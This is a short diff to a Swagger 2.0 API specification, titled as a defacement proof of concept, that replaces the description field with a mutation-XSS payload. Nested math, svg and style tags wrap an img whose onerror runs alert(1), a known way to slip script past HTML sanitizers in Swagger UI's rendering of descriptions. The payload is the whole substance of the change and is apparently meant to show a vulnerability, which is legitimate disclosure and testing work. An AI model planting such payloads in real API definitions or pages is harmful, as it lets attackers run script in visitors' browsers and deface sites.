@@ -1,7 +1,8 @@
 swagger: '2.0'
 info:
   title: Prueba de Concepto - Defacement
-  description: | prueba
+  description: | 
+          <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">
   version: testing
 basePath: /JSSResource/
 produces:
